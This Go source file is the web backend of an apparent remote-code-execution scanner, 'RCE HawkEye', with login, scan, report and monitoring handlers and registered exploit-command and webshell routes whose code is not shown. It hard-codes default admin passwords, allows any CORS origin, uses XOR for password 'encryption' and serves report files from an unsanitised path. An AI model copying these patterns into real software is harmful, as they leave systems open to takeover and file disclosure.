package web

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/hbzw/RCE_HawkEye_go/internal/history"
	"github.com/hbzw/RCE_HawkEye_go/internal/notification"
	"github.com/hbzw/RCE_HawkEye_go/internal/reporter"
	"github.com/hbzw/RCE_HawkEye_go/internal/types"
)

type User struct {
	Username string `json:"username"`
	Password string `json:"password"`
	Role     string `json:"role"`
}

type cpuUsageTracker struct {
	lastTime      time.Time
	currentUsage  float64
	mutex         sync.Mutex
}

var cpuTracker = &cpuUsageTracker{}

type Session struct {
	ID        string    `json:"id"`
	Username  string    `json:"username"`
	Role      string    `json:"role"`
	CreatedAt time.Time `json:"created_at"`
	ExpiresAt time.Time `json:"expires_at"`
}

type ScanStatus struct {
	ID           string                 `json:"id"`
	Target       string                 `json:"target"`
	Status       string                 `json:"status"`
	Progress     int                    `json:"progress"`
	CurrentTask  string                 `json:"current_task"`
	StartTime    time.Time              `json:"start_time"`
	EndTime      *time.Time             `json:"end_time,omitempty"`
	VulnCount    int                    `json:"vuln_count"`
	TotalTargets int                    `json:"total_targets"`
	Scanned      int                    `json:"scanned"`
	Vulns        []types.Vulnerability  `json:"vulns,omitempty"`
	Error        string                 `json:"error,omitempty"`
	Config       map[string]interface{} `json:"config,omitempty"`
	Extra        map[string]interface{} `json:"extra,omitempty"`
}

type ScanRequest struct {
	URL            string   `json:"url"`
	URLs           []string `json:"urls"`
	RawTraffic     string   `json:"raw_traffic"`
	Method         string   `json:"method"`
	Data           string   `json:"data"`
	Headers        []string `json:"headers"`
	
	Crawl          bool     `json:"crawl"`
	DirScan        bool     `json:"dir_scan"`
	ParamFuzz      bool     `json:"param_fuzz"`
	
	DirWordlist    string   `json:"dir_wordlist"`
	DirThreads     int      `json:"dir_threads"`
	DirFilterStatus string  `json:"dir_filter_status"`
	
	Concurrent     int      `json:"concurrent"`
	Timeout        int      `json:"timeout"`
	ScanLevel      int      `json:"scan_level"`
	ScanMode       string   `json:"scan_mode"`
	
	Proxy          string   `json:"proxy"`
	UserAgent      string   `json:"user_agent"`
	VerifySSL      bool     `json:"verify_ssl"`
	
	OutputFormat   string   `json:"output_format"`
	IncludeResponse bool    `json:"include_response"`
}

type Server struct {
	Port          int
	users         map[string]User
	sessions      map[string]Session
	sessionMutex  sync.RWMutex
	scans         map[string]*ScanStatus
	scanMutex     sync.RWMutex
	reportDir     string
	staticDir     string
	cancelFuncs   map[string]context.CancelFunc
	cancelMutex   sync.RWMutex
	sessionExpiry time.Duration
	
	perfData          []PerformanceDataPoint
	perfMutex         sync.RWMutex
	maxPerfPoints     int
	alerts            []Alert
	alertMutex        sync.RWMutex
	maxAlerts         int
	totalBytesSent    int64
	totalBytesReceived int64
}

type PerformanceDataPoint struct {
	Timestamp     int64   `json:"timestamp"`
	MemoryMB      float64 `json:"memory_mb"`
	HeapMB        float64 `json:"heap_mb"`
	StackMB       float64 `json:"stack_mb"`
	Goroutines    int     `json:"goroutines"`
	CPUUsage      float64 `json:"cpu_usage"`
	NetworkIOKB   int64   `json:"network_io_kb"`
	NetworkTx     int64   `json:"network_tx"`
	NetworkRx     int64   `json:"network_rx"`
	ScansTotal    int     `json:"scans_total"`
	ScansRunning  int     `json:"scans_running"`
	VulnsTotal    int     `json:"vulns_total"`
	GCPauseMs     float64 `json:"gc_pause_ms"`
}

type Alert struct {
	ID        string    `json:"id"`
	Type      string    `json:"type"`
	Level     string    `json:"level"`
	Message   string    `json:"message"`
	Timestamp time.Time `json:"timestamp"`
	Read      bool      `json:"read"`
}

func NewServer(port int, reportDir string) *Server {
	users := map[string]User{
		"admin":   {Username: "admin", Password: "admin123", Role: "admin"},
		"scanner": {Username: "scanner", Password: "scan123", Role: "user"},
	}
	
	return &Server{
		Port:          port,
		users:         users,
		sessions:      make(map[string]Session),
		scans:         make(map[string]*ScanStatus),
		reportDir:     reportDir,
		staticDir:     "",
		cancelFuncs:   make(map[string]context.CancelFunc),
		sessionExpiry: 24 * time.Hour,
		perfData:      make([]PerformanceDataPoint, 0),
		maxPerfPoints: 1000,
		alerts:        make([]Alert, 0),
		maxAlerts:     100,
	}
}

func (s *Server) Start() error {
	mux := http.NewServeMux()
	
	mux.HandleFunc("/", s.handleIndex)
	mux.HandleFunc("/login", s.handleLoginPage)
	mux.HandleFunc("/dashboard", s.authMiddleware(s.handleDashboard))
	
	mux.HandleFunc("/api/login", s.handleLogin)
	mux.HandleFunc("/api/logout", s.handleLogout)
	
	mux.HandleFunc("/api/scan", s.authMiddleware(s.handleScan))
	mux.HandleFunc("/api/scan/", s.authMiddleware(s.handleScanOperation))
	mux.HandleFunc("/api/status", s.authMiddleware(s.handleStatus))
	mux.HandleFunc("/api/status/", s.authMiddleware(s.handleScanStatus))
	mux.HandleFunc("/api/stop/", s.authMiddleware(s.handleStop))
	mux.HandleFunc("/api/reports", s.authMiddleware(s.handleReports))
	mux.HandleFunc("/api/reports/delete/", s.authMiddleware(s.handleReportDelete))
	mux.HandleFunc("/api/reports/batch-delete", s.authMiddleware(s.handleReportBatchDelete))
	mux.HandleFunc("/api/reports/clear", s.authMiddleware(s.handleReportsClear))
	mux.HandleFunc("/api/reports/", s.authMiddleware(s.handleReportDetail))
	mux.HandleFunc("/api/monitor", s.authMiddleware(s.handleMonitor))
	mux.HandleFunc("/api/monitor/history", s.authMiddleware(s.handlePerfHistory))
	mux.HandleFunc("/api/alerts", s.authMiddleware(s.handleAlerts))
	mux.HandleFunc("/api/alerts/clear", s.authMiddleware(s.handleAlertsClear))
	mux.HandleFunc("/api/config", s.authMiddleware(s.handleConfig))
	mux.HandleFunc("/api/stats", s.authMiddleware(s.handleStats))
	mux.HandleFunc("/api/history", s.authMiddleware(s.handleHistory))
	mux.HandleFunc("/api/history/clear", s.authMiddleware(s.handleHistoryClear))
	mux.HandleFunc("/api/history/detail/", s.authMiddleware(s.handleHistoryDetail))
	mux.HandleFunc("/api/history/search", s.authMiddleware(s.handleHistorySearch))
	mux.HandleFunc("/api/history/grouped", s.authMiddleware(s.handleHistoryGrouped))
	mux.HandleFunc("/api/history/stats", s.authMiddleware(s.handleHistoryStats))
	mux.HandleFunc("/api/history/export", s.authMiddleware(s.handleHistoryExport))
	mux.HandleFunc("/api/history/domains", s.authMiddleware(s.handleHistoryDomains))
	mux.HandleFunc("/api/history/domain/", s.authMiddleware(s.handleHistoryDomain))
	mux.HandleFunc("/api/history/dates", s.authMiddleware(s.handleHistoryDates))
	mux.HandleFunc("/api/history/notes/", s.authMiddleware(s.handleHistoryNotes))
	mux.HandleFunc("/api/history/delete/", s.authMiddleware(s.handleHistoryDelete))
	mux.HandleFunc("/api/history/batch-delete", s.authMiddleware(s.handleHistoryBatchDelete))
	mux.HandleFunc("/api/notification/config", s.authMiddleware(s.handleNotificationConfig))
	mux.HandleFunc("/api/notification/test", s.authMiddleware(s.handleNotificationTest))
	mux.HandleFunc("/api/settings", s.authMiddleware(s.handleSettings))
	mux.HandleFunc("/api/settings/password", s.authMiddleware(s.handlePasswordChange))
	mux.HandleFunc("/api/settings/reset", s.authMiddleware(s.handleSettingsReset))
	mux.HandleFunc("/api/dict/stats", s.authMiddleware(s.handleDictStats))
	mux.HandleFunc("/api/dict/reset", s.authMiddleware(s.handleDictReset))
	mux.HandleFunc("/api/proxy/test", s.authMiddleware(s.handleProxyTest))
	mux.HandleFunc("/api/factory-reset", s.authMiddleware(s.handleFactoryReset))
	mux.HandleFunc("/api/export", s.authMiddleware(s.handleExport))
	mux.HandleFunc("/api/vulns", s.authMiddleware(s.handleVulns))
	mux.HandleFunc("/api/exploit/cmd", s.authMiddleware(s.handleExploitCmd))
	mux.HandleFunc("/api/exploit/webshell", s.authMiddleware(s.handleExploitWebshell))
	mux.HandleFunc("/api/local-ip", s.authMiddleware(s.handleLocalIP))
	mux.HandleFunc("/api/version", s.authMiddleware(s.handleVersion))
	mux.HandleFunc("/api/version/check", s.authMiddleware(s.handleVersionCheck))
	
	mux.HandleFunc("/static/", s.handleStatic)
	
	addr := fmt.Sprintf(":%d", s.Port)
	fmt.Printf("[*] RCE HawkEye Web Server starting on http://localhost%s\n", addr)
	fmt.Printf("[*] Report directory: %s\n", s.reportDir)
	fmt.Printf("[*] Default credentials: admin / admin123\n")
	
	return http.ListenAndServe(addr, s.corsMiddleware(mux))
}

func (s *Server) corsMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
		
		if r.Method == "OPTIONS" {
			w.WriteHeader(http.StatusOK)
			return
		}
		
		next.ServeHTTP(w, r)
	})
}

func (s *Server) authMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		sessionCookie, err := r.Cookie("session_id")
		if err != nil {
			if strings.HasPrefix(r.URL.Path, "/api/") {
				s.writeError(w, "Unauthorized", http.StatusUnauthorized)
			} else {
				http.Redirect(w, r, "/login", http.StatusFound)
			}
			return
		}
		
		s.sessionMutex.RLock()
		session, exists := s.sessions[sessionCookie.Value]
		s.sessionMutex.RUnlock()
		
		if !exists || time.Now().After(session.ExpiresAt) {
			if strings.HasPrefix(r.URL.Path, "/api/") {
				s.writeError(w, "Session expired", http.StatusUnauthorized)
			} else {
				http.Redirect(w, r, "/login", http.StatusFound)
			}
			return
		}
		
		next(w, r)
	}
}

func (s *Server) handleIndex(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	
	sessionCookie, err := r.Cookie("session_id")
	if err != nil {
		http.Redirect(w, r, "/login", http.StatusFound)
		return
	}
	
	s.sessionMutex.RLock()
	_, exists := s.sessions[sessionCookie.Value]
	s.sessionMutex.RUnlock()
	
	if !exists {
		http.Redirect(w, r, "/login", http.StatusFound)
		return
	}
	
	http.Redirect(w, r, "/dashboard", http.StatusFound)
}

func (s *Server) handleLoginPage(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write([]byte(loginHTML))
}

func (s *Server) handleDashboard(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write([]byte(dashboardHTML))
}

func (s *Server) handleLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	var req struct {
		Username  string `json:"username"`
		Password  string `json:"password"`
		Nonce     string `json:"nonce"`
		Timestamp string `json:"timestamp"`
	}
	
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		s.writeError(w, "Invalid request body")
		return
	}
	
	if req.Username == "" || req.Password == "" {
		s.writeError(w, "Username and password are required")
		return
	}
	
	var password string
	if req.Nonce != "" && req.Timestamp != "" {
		encryptedBytes, err := base64.StdEncoding.DecodeString(req.Password)
		if err != nil {
			s.writeError(w, "Invalid password encoding")
			return
		}
		
		clientKey := req.Nonce + req.Timestamp
		decrypted := make([]byte, len(encryptedBytes))
		for i, b := range encryptedBytes {
			decrypted[i] = b ^ clientKey[i%len(clientKey)]
		}
		password = string(decrypted)
	} else {
		password = req.Password
	}
	
	user, exists := s.users[req.Username]
	if !exists || user.Password != password {
		time.Sleep(100 * time.Millisecond)
		s.writeError(w, "Invalid username or password")
		return
	}
	
	sessionID := generateSessionID()
	session := Session{
		ID:        sessionID,
		Username:  user.Username,
		Role:      user.Role,
		CreatedAt: time.Now(),
		ExpiresAt: time.Now().Add(s.sessionExpiry),
	}
	
	s.sessionMutex.Lock()
	s.sessions[sessionID] = session
	s.sessionMutex.Unlock()
	
	http.SetCookie(w, &http.Cookie{
		Name:     "session_id",
		Value:    sessionID,
		Path:     "/",
		HttpOnly: true,
		Secure:   false,
		SameSite: http.SameSiteStrictMode,
		MaxAge:   int(s.sessionExpiry.Seconds()),
	})
	
	s.writeJSON(w, map[string]interface{}{
		"success":  true,
		"message":  "Login successful",
		"username": user.Username,
		"role":     user.Role,
	})
}

func (s *Server) handleLogout(w http.ResponseWriter, r *http.Request) {
	sessionCookie, err := r.Cookie("session_id")
	if err == nil {
		s.sessionMutex.Lock()
		delete(s.sessions, sessionCookie.Value)
		s.sessionMutex.Unlock()
	}
	
	http.SetCookie(w, &http.Cookie{
		Name:     "session_id",
		Value:    "",
		Path:     "/",
		HttpOnly: true,
		MaxAge:   -1,
	})
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"message": "Logged out",
	})
}

func (s *Server) handleScan(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	var req ScanRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		s.writeError(w, "Invalid request body: "+err.Error())
		return
	}
	
	if req.URL == "" && len(req.URLs) == 0 && req.RawTraffic == "" {
		s.writeError(w, "URL, URLs or raw_traffic is required")
		return
	}
	
	scanID := fmt.Sprintf("scan_%d", time.Now().UnixNano())
	
	status := &ScanStatus{
		ID:        scanID,
		Status:    "pending",
		StartTime: time.Now(),
		Config: map[string]interface{}{
			"crawl":      req.Crawl,
			"dir_scan":   req.DirScan,
			"param_fuzz": req.ParamFuzz,
			"concurrent": req.Concurrent,
			"timeout":    req.Timeout,
			"scan_level": req.ScanLevel,
			"scan_mode":  req.ScanMode,
		},
	}
	
	if req.URL != "" {
		status.Target = req.URL
	} else if len(req.URLs) > 0 {
		status.Target = fmt.Sprintf("%d targets", len(req.URLs))
		status.TotalTargets = len(req.URLs)
	} else {
		status.Target = "Traffic file"
	}
	
	s.scanMutex.Lock()
	s.scans[scanID] = status
	s.scanMutex.Unlock()
	
	ctx, cancel := context.WithCancel(context.Background())
	
	s.cancelMutex.Lock()
	s.cancelFuncs[scanID] = cancel
	s.cancelMutex.Unlock()
	
	go s.runScan(ctx, scanID, req)
	
	s.writeJSON(w, map[string]interface{}{
		"success":  true,
		"scan_id":  scanID,
		"message":  "Scan started",
		"status":   status,
	})
}

func (s *Server) handleScanOperation(w http.ResponseWriter, r *http.Request) {
	path := strings.TrimPrefix(r.URL.Path, "/api/scan/")
	
	if strings.HasSuffix(path, "/batch") {
		s.handleBatchScan(w, r)
		return
	}
	
	http.Error(w, "Not found", http.StatusNotFound)
}

func (s *Server) handleBatchScan(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	var req struct {
		URLs    []string `json:"urls"`
		Options ScanRequest `json:"options"`
	}
	
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		s.writeError(w, "Invalid request body: "+err.Error())
		return
	}
	
	if len(req.URLs) == 0 {
		s.writeError(w, "URLs list is empty")
		return
	}
	
	var scanIDs []string
	
	for _, url := range req.URLs {
		scanReq := req.Options
		scanReq.URL = url
		scanReq.URLs = nil
		
		scanID := fmt.Sprintf("scan_%d_%s", time.Now().UnixNano(), urlHash(url))
		
		status := &ScanStatus{
			ID:        scanID,
			Target:    url,
			Status:    "pending",
			StartTime: time.Now(),
			Config: map[string]interface{}{
				"crawl":      scanReq.Crawl,
				"dir_scan":   scanReq.DirScan,
				"param_fuzz": scanReq.ParamFuzz,
			},
		}
		
		s.scanMutex.Lock()
		s.scans[scanID] = status
		s.scanMutex.Unlock()
		
		ctx, cancel := context.WithCancel(context.Background())
		s.cancelMutex.Lock()
		s.cancelFuncs[scanID] = cancel
		s.cancelMutex.Unlock()
		
		go s.runScan(ctx, scanID, scanReq)
		scanIDs = append(scanIDs, scanID)
	}
	
	s.writeJSON(w, map[string]interface{}{
		"success":   true,
		"message":   fmt.Sprintf("Started %d scans", len(scanIDs)),
		"scan_ids":  scanIDs,
	})
}

func (s *Server) handleStatus(w http.ResponseWriter, r *http.Request) {
	s.scanMutex.RLock()
	defer s.scanMutex.RUnlock()
	
	var scans []*ScanStatus
	for _, scan := range s.scans {
		scans = append(scans, scan)
	}
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"scans":   scans,
		"total":   len(scans),
	})
}

func (s *Server) handleScanStatus(w http.ResponseWriter, r *http.Request) {
	scanID := strings.TrimPrefix(r.URL.Path, "/api/status/")
	
	s.scanMutex.RLock()
	scan, exists := s.scans[scanID]
	s.scanMutex.RUnlock()
	
	if !exists {
		s.writeError(w, "Scan not found")
		return
	}
	
	response := map[string]interface{}{
		"success":      true,
		"id":           scan.ID,
		"status":       scan.Status,
		"progress":     scan.Progress,
		"current_task": scan.CurrentTask,
		"target":       scan.Target,
		"vuln_count":   scan.VulnCount,
		"total_targets": scan.TotalTargets,
		"scanned":      scan.Scanned,
	}
	
	if scan.StartTime != (time.Time{}) {
		response["start_time"] = scan.StartTime.Format("2006-01-02 15:04:05")
	}
	if scan.EndTime != nil {
		response["end_time"] = scan.EndTime.Format("2006-01-02 15:04:05")
	}
	if scan.Error != "" {
		response["error"] = scan.Error
	}
	if len(scan.Vulns) > 0 {
		response["vulns"] = scan.Vulns
	}
	
	s.writeJSON(w, response)
}

func (s *Server) handleStop(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	scanID := strings.TrimPrefix(r.URL.Path, "/api/stop/")
	
	s.cancelMutex.RLock()
	cancel, exists := s.cancelFuncs[scanID]
	s.cancelMutex.RUnlock()
	
	if !exists {
		s.writeError(w, "Scan not found or already completed")
		return
	}
	
	cancel()
	
	s.scanMutex.Lock()
	if scan, ok := s.scans[scanID]; ok {
		scan.Status = "stopped"
		now := time.Now()
		scan.EndTime = &now
	}
	s.scanMutex.Unlock()
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"message": "Scan stopped",
	})
}

func (s *Server) handleReports(w http.ResponseWriter, r *http.Request) {
	files, err := os.ReadDir(s.reportDir)
	if err != nil {
		s.writeJSON(w, map[string]interface{}{
			"success": true,
			"reports": []interface{}{},
		})
		return
	}
	
	var reports []map[string]interface{}
	
	for _, file := range files {
		if file.IsDir() {
			continue
		}
		
		name := file.Name()
		ext := filepath.Ext(name)
		if ext != ".json" && ext != ".md" && ext != ".html" {
			continue
		}
		
		info, err := file.Info()
		if err != nil {
			continue
		}
		
		reports = append(reports, map[string]interface{}{
			"name":     name,
			"path":     filepath.Join(s.reportDir, name),
			"size":     info.Size(),
			"modified": info.ModTime(),
			"type":     strings.TrimPrefix(ext, "."),
		})
	}
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"reports": reports,
	})
}

func (s *Server) handleReportDetail(w http.ResponseWriter, r *http.Request) {
	filename := strings.TrimPrefix(r.URL.Path, "/api/reports/")
	filePath := filepath.Join(s.reportDir, filename)
	
	content, err := os.ReadFile(filePath)
	if err != nil {
		s.writeError(w, "Report not found")
		return
	}
	
	if strings.HasSuffix(filename, ".json") {
		var data interface{}
		if err := json.Unmarshal(content, &data); err != nil {
			s.writeError(w, "Invalid JSON report")
			return
		}
		s.writeJSON(w, map[string]interface{}{
			"success": true,
			"report":  data,
		})
	} else if strings.HasSuffix(filename, ".html") {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Header().Set("Content-Disposition", "inline; filename="+filename)
		w.Write(content)
	} else if strings.HasSuffix(filename, ".md") {
		w.Header().Set("Content-Type", "text/markdown; charset=utf-8")
		w.Header().Set("Content-Disposition", "attachment; filename="+filename)
		w.Write(content)
	} else {
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
		w.Header().Set("Content-Disposition", "attachment; filename="+filename)
		w.Write(content)
	}
}

func (s *Server) handleReportDelete(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	filename := strings.TrimPrefix(r.URL.Path, "/api/reports/delete/")
	if filename == "" {
		s.writeError(w, "Filename is required")
		return
	}
	
	// Security check: only allow deleting files in the reports directory
	filePath := filepath.Join(s.reportDir, filepath.Base(filename))
	
	// Check if file exists
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		s.writeError(w, "Report not found")
		return
	}
	
	// Delete the file
	if err := os.Remove(filePath); err != nil {
		s.writeError(w, "Failed to delete report: "+err.Error())
		return
	}
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"message": "Report deleted",
	})
}

func (s *Server) handleReportBatchDelete(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	var req struct {
		Files []string `json:"files"`
	}
	
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		s.writeError(w, "Invalid request body")
		return
	}
	
	if len(req.Files) == 0 {
		s.writeError(w, "No files provided")
		return
	}
	
	var deleted int
	var failed int
	
	for _, filename := range req.Files {
		filePath := filepath.Join(s.reportDir, filepath.Base(filename))
		if _, err := os.Stat(filePath); os.IsNotExist(err) {
			failed++
			continue
		}
		if err := os.Remove(filePath); err != nil {
			failed++
		} else {
			deleted++
		}
	}
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"deleted": deleted,
		"failed":  failed,
		"message": fmt.Sprintf("Deleted %d reports, failed %d", deleted, failed),
	})
}

func (s *Server) handleMonitor(w http.ResponseWriter, r *http.Request) {
	var m runtime.MemStats
	runtime.ReadMemStats(&m)
	
	s.scanMutex.RLock()
	totalScans := len(s.scans)
	runningScans := 0
	completedScans := 0
	pendingScans := 0
	totalVulns := 0
	totalRequests := 0
	
	for _, scan := range s.scans {
		switch scan.Status {
		case "running":
			runningScans++
		case "completed":
			completedScans++
		case "pending":
			pendingScans++
		}
		totalVulns += scan.VulnCount
		totalRequests += scan.Scanned
	}
	s.scanMutex.RUnlock()
	
	memoryMB := float64(m.Alloc) / 1024 / 1024
	heapMB := float64(m.HeapAlloc) / 1024 / 1024
	stackMB := float64(m.StackInuse) / 1024 / 1024
	goroutines := runtime.NumGoroutine()
	
	gcPauseMs := float64(m.PauseTotalNs) / 1000000
	
	cpuUsage := s.calculateCPUUsage()
	
	networkIOKB := int64(0)
	if s.totalBytesSent > 0 || s.totalBytesReceived > 0 {
		networkIOKB = (s.totalBytesSent + s.totalBytesReceived) / 1024
	}
	
	dataPoint := PerformanceDataPoint{
		Timestamp:     time.Now().Unix(),
		MemoryMB:      memoryMB,
		HeapMB:        heapMB,
		StackMB:       stackMB,
		Goroutines:    goroutines,
		CPUUsage:      cpuUsage,
		NetworkIOKB:   networkIOKB,
		NetworkTx:     s.totalBytesSent / 1024,
		NetworkRx:     s.totalBytesReceived / 1024,
		ScansTotal:    totalScans,
		ScansRunning:  runningScans,
		VulnsTotal:    totalVulns,
		GCPauseMs:     gcPauseMs,
	}
	
	s.perfMutex.Lock()
	s.perfData = append(s.perfData, dataPoint)
	if len(s.perfData) > s.maxPerfPoints {
		s.perfData = s.perfData[len(s.perfData)-s.maxPerfPoints:]
	}
	s.perfMutex.Unlock()
	
	if memoryMB > 500 {
		s.addAlert("memory", "warning", fmt.Sprintf("High memory usage: %.1f MB", memoryMB))
	}
	if runningScans > 10 {
		s.addAlert("scan", "info", fmt.Sprintf("%d scans running concurrently", runningScans))
	}
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"system": map[string]interface{}{
			"goroutines":     goroutines,
			"memory_mb":      int(memoryMB),
			"memory_total":   int(m.Sys / 1024 / 1024),
			"heap_mb":        int(heapMB),
			"stack_mb":       int(stackMB),
			"gc_pause_ns":    m.PauseTotalNs,
			"gc_pause_ms":    int(gcPauseMs),
			"cpu_cores":      runtime.NumCPU(),
			"cpu_usage":      int(cpuUsage),
			"go_version":     runtime.Version(),
			"network_io_kb":  networkIOKB,
			"num_gc":         m.NumGC,
			"num_goroutine":  goroutines,
		},
		"scans": map[string]interface{}{
			"total":     totalScans,
			"running":   runningScans,
			"completed": completedScans,
			"pending":   pendingScans,
		},
		"vulnerabilities": map[string]interface{}{
			"total":    totalVulns,
			"requests": totalRequests,
		},
		"timestamp": time.Now().Unix(),
	})
}

func (s *Server) calculateCPUUsage() float64 {
	cpuTracker.mutex.Lock()
	defer cpuTracker.mutex.Unlock()
	
	now := time.Now()
	
	if cpuTracker.lastTime.IsZero() {
		cpuTracker.lastTime = now
		cpuTracker.currentUsage = 0.0
		return 0.0
	}
	
	elapsed := now.Sub(cpuTracker.lastTime).Seconds()
	if elapsed < 0.5 {
		return cpuTracker.currentUsage
	}
	
	cpuUsage := getProcessCPUUsage()
	
	cpuTracker.lastTime = now
	cpuTracker.currentUsage = cpuUsage
	
	return cpuUsage
}

func (s *Server) handlePerfHistory(w http.ResponseWriter, r *http.Request) {
	timeRange := r.URL.Query().Get("range")
	
	s.perfMutex.RLock()
	data := make([]PerformanceDataPoint, len(s.perfData))
	copy(data, s.perfData)
	s.perfMutex.RUnlock()
	
	now := time.Now().Unix()
	var filteredData []PerformanceDataPoint
	
	switch timeRange {
	case "realtime":
		cutoff := now - 300
		for _, d := range data {
			if d.Timestamp >= cutoff {
				filteredData = append(filteredData, d)
			}
		}
	case "hour":
		cutoff := now - 3600
		for _, d := range data {
			if d.Timestamp >= cutoff {
				filteredData = append(filteredData, d)
			}
		}
	case "today":
		cutoff := now - 86400
		for _, d := range data {
			if d.Timestamp >= cutoff {
				filteredData = append(filteredData, d)
			}
		}
	case "week":
		cutoff := now - 604800
		for _, d := range data {
			if d.Timestamp >= cutoff {
				filteredData = append(filteredData, d)
			}
		}
	default:
		filteredData = data
	}
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"data":    filteredData,
		"total":   len(filteredData),
	})
}

func (s *Server) handleAlerts(w http.ResponseWriter, r *http.Request) {
	s.alertMutex.RLock()
	alerts := make([]Alert, len(s.alerts))
	copy(alerts, s.alerts)
	s.alertMutex.RUnlock()
	
	for i := range alerts {
		alerts[i].Read = true
	}
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"alerts":  alerts,
		"total":   len(alerts),
	})
}

func (s *Server) handleAlertsClear(w http.ResponseWriter, r *http.Request) {
	s.alertMutex.Lock()
	s.alerts = make([]Alert, 0)
	s.alertMutex.Unlock()
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"message": "Alerts cleared",
	})
}

func (s *Server) addAlert(alertType, level, message string) {
	alert := Alert{
		ID:        generateSessionID(),
		Type:      alertType,
		Level:     level,
		Message:   message,
		Timestamp: time.Now(),
		Read:      false,
	}
	
	s.alertMutex.Lock()
	s.alerts = append([]Alert{alert}, s.alerts...)
	if len(s.alerts) > s.maxAlerts {
		s.alerts = s.alerts[:s.maxAlerts]
	}
	s.alertMutex.Unlock()
}

func (s *Server) handleConfig(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		s.writeJSON(w, map[string]interface{}{
			"success": true,
			"config": map[string]interface{}{
				"timeout":         10,
				"concurrent":      10,
				"scan_level":      2,
				"scan_mode":       "echo",
				"crawl":           false,
				"dir_scan":        true,
				"param_fuzz":      true,
				"dir_threads":     10,
				"delay_threshold": 4.0,
				"user_agent":      "RCE-HawkEye/1.1.1",
			},
		})
		return
	}
	
	http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
}

func (s *Server) handleStats(w http.ResponseWriter, r *http.Request) {
	s.scanMutex.RLock()
	defer s.scanMutex.RUnlock()
	
	totalScans := len(s.scans)
	criticalVulns := 0
	highVulns := 0
	mediumVulns := 0
	lowVulns := 0
	targetsScanned := 0
	
	for _, scan := range s.scans {
		if scan.Status == "completed" {
			targetsScanned++
		}
		for _, v := range scan.Vulns {
			switch v.Severity {
			case types.SeverityCritical:
				criticalVulns++
			case types.SeverityHigh:
				highVulns++
			case types.SeverityMedium:
				mediumVulns++
			case types.SeverityLow:
				lowVulns++
			}
		}
	}
	
	s.writeJSON(w, map[string]interface{}{
		"success":        true,
		"total_scans":    totalScans,
		"critical_vulns": criticalVulns,
		"high_vulns":     highVulns,
		"medium_vulns":   mediumVulns,
		"low_vulns":      lowVulns,
		"targets_scanned": targetsScanned,
	})
}

func (s *Server) handleHistory(w http.ResponseWriter, r *http.Request) {
	historyMgr := history.GetManager()
	allHistory := historyMgr.GetAll()
	
	fmt.Printf("[DEBUG] handleHistory: Found %d history records\n", len(allHistory))
	
	result := make([]map[string]interface{}, 0)
	for _, h := range allHistory {
		result = append(result, map[string]interface{}{
			"id":             h.ID,
			"target":         h.Target,
			"domain":         h.Domain,
			"timestamp":      h.StartTime.Format("2006-01-02 15:04:05"),
			"vuln_count":     h.VulnCount,
			"status":         h.Status,
			"duration":       h.Duration,
			"critical_vulns": h.CriticalVulns,
			"high_vulns":     h.HighVulns,
			"medium_vulns":   h.MediumVulns,
			"low_vulns":      h.LowVulns,
			"scan_mode":      h.ScanMode,
			"scan_level":     h.ScanLevel,
		})
	}
	
	fmt.Printf("[DEBUG] handleHistory: Returning %d records\n", len(result))
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"history": result,
	})
}

func (s *Server) handleHistoryClear(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	s.scanMutex.Lock()
	for id, scan := range s.scans {
		if scan.Status == "completed" || scan.Status == "error" || scan.Status == "stopped" {
			delete(s.scans, id)
		}
	}
	s.scanMutex.Unlock()
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"message": "History cleared",
	})
}

